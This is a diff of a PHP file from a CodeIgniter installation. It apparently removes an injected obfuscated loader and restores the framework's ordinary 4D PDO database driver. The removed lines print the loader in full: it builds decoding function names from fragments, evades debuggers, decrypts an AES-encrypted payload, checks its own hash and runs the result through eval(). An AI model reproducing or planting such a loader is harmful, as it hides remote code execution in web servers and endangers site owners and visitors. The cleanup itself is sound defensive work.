@@ -1,28 +1,179 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_kv3tirbu=('bas'.'e64'.'_de'.'cod'.'e');
-$_xdhyhekv=('gzu'.'nco'.'mpr'.'ess');
-$_v9xy9h7n=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_smrlgedt='5O/XY+go';
-$_dfkjp6zv='77uaHUF8';
-$_cy73v6nm='p0gSBndS';
-$_aftdwh4g='1ifOCJNj';
-$_lgpeywq0='LpbQ0R+NvWo=';
-$_py3kyrl0='l+Gq/w==';
-$_pug566rc='ganjN0x/';
-$_eto3by0c='4M1VOpqn';
-$_z7smzp82=$_kv3tirbu($_dfkjp6zv.$_cy73v6nm.$_smrlgedt.$_aftdwh4g.$_lgpeywq0);
-$_z68kwecs=$_kv3tirbu($_pug566rc.$_eto3by0c.$_py3kyrl0);
-$_zeshb4uc=$_kv3tirbu('Lb0AR6dyf0qlVeVG6VjkzTWLFC7dO67RJNe8U6ilodPdXux1IQLkHuzqepMaymwjigG0iU6lQvkOa9TmRu++flbWnjtGw4S5e5WzwKqb4pr1guFhZ6oE/Cw/kotrwr8AawOjBdMGMIrXXPPTAu7NnQRJtn19+BeFPufF4MxO12gQ4tOQSrlEgfnlvCjDCQaGwinVOziD/oT4erPpHY+/01H6LZFCPwNx2TTYW2LWBBTvafuPhZnmxrRufD4mxoRvQUYuVGhfY8sJo00pu1yJIFm8rH7zIIWMXORPWCBIPlHVsfT1IgXox1lG1eYLthtp6jaF2Srrj8IQhM1dnWf2QbpW6EcyTKCnOnZ5TNp4a/Z4nVKAKLe9hnB5igj3Q8vqm2XYgzXbGJJEdqcMxB7E2T3mTr4fY4VUTzcsbXz7sp5MXXXzNXIATf9aWboB+GGi+49lTp/1RPwDivLFFYHhHvJK917YJ12qMTFkucWs2nuUo7gNXX+rNrEGM1I9EnSp570D3EMfCZdptK8lbR0AlhdOt3txHYNNIhGMgczF3Qsmel35FqAfc06sWhsgiomNXrozyoFF3vYcMzxqpEfKU1oYceElTtbBkgaEam5wLiLvjRGdVcO62gCuVOpbX99m3PjDH9giy32dg8bW0SCW5HevEER0j1udu+M0lhP4DmvzpfgNss2S2aYX3A1dKIkhbYLHGtk4lhlpVPm43lOKGTWkyb2Np0AD2hjgy8JOZO1K10NmIcbGXqBs4QGb60eJpwAwnk3dsEOJqDv/FmE29MpS5Wc7A4maAlBUar/Pf7pGOtHaY17nh3FAs6TDgL2nNWeSGvj2TSmISxE3t3jDBEx2BmvpsRWTFgyqItvCmmAALLO4Kt9PpmYD/yyGjcTqKqsXLOuGka4L2PkbBoD/QF+SEuvajomxnEUZXETKLiQ=');
-$_vyyvgt5k=$_v9xy9h7n($_zeshb4uc,'aes-256-cbc',$_z7smzp82,OPENSSL_RAW_DATA,$_z68kwecs);
-if($_vyyvgt5k===false){exit;}
-$_xqm49qwd=$_xdhyhekv($_vyyvgt5k);
-if($_xqm49qwd===false){exit;}
-$_l5bpudrx='cf253b89178aff835ab0a319173c5ecb4a80b2ba6af3da1f966b2601abd50386';
-$_wwnb9f9a=@file_get_contents(__FILE__);
-if($_wwnb9f9a!==false){
-$_gf4pvxhi=str_replace($_l5bpudrx,"0000000000000000000000000000000000000000000000000000000000000000",$_wwnb9f9a);
-$_epl9yr4g=hash("sha256",$_gf4pvxhi);
-if($_epl9yr4g!==$_l5bpudrx){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_pdo_4d_driver extends CI_DB_pdo_driver {
+
+
+
+
+
+public $subdriver = '4d';
+
+
+
+
+
+protected $_escape_char = array('[', ']');
+
+
+
+
+
+
+
+
+
+public function __construct($params)
+{
+parent::__construct($params);
+if (empty($this->dsn))
+{
+$this->dsn = '4D:host='.(empty($this->hostname) ? '127.0.0.1' : $this->hostname);
+empty($this->port) OR $this->dsn .= ';port='.$this->port;
+empty($this->database) OR $this->dsn .= ';dbname='.$this->database;
+empty($this->char_set) OR $this->dsn .= ';charset='.$this->char_set;
 }
-eval($_xqm49qwd);
+elseif ( ! empty($this->char_set) && strpos($this->dsn, 'charset=', 3) === FALSE)
+{
+$this->dsn .= ';charset='.$this->char_set;
+}
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+$sql = 'SELECT '.$this->escape_identifiers('TABLE_NAME').' FROM '.$this->escape_identifiers('_USER_TABLES');
+if ($prefix_limit === TRUE && $this->dbprefix !== '')
+{
+$sql .= ' WHERE '.$this->escape_identifiers('TABLE_NAME')." LIKE '".$this->escape_like_str($this->dbprefix)."%' "
+.sprintf($this->_like_escape_str, $this->_like_escape_chr);
+}
+return $sql;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_columns($table = '')
+{
+return 'SELECT '.$this->escape_identifiers('COLUMN_NAME').' FROM '.$this->escape_identifiers('_USER_COLUMNS')
+.' WHERE '.$this->escape_identifiers('TABLE_NAME').' = '.$this->escape($table);
+}
+
+
+
+
+
+
+
+
+
+protected function _field_data($table)
+{
+return 'SELECT * FROM '.$this->protect_identifiers($table, TRUE, NULL, FALSE).' LIMIT 1';
+}
+
+
+
+
+
+
+
+
+
+
+protected function _update($table, $values)
+{
+$this->qb_limit = FALSE;
+$this->qb_orderby = array();
+return parent::_update($table, $values);
+}
+
+
+
+
+
+
+
+
+
+protected function _delete($table)
+{
+$this->qb_limit = FALSE;
+return parent::_delete($table);
+}
+
+
+
+
+
+
+
+
+
+protected function _limit($sql)
+{
+return $sql.' LIMIT '.$this->qb_limit.($this->qb_offset ? ' OFFSET '.$this->qb_offset : '');
+}
+}
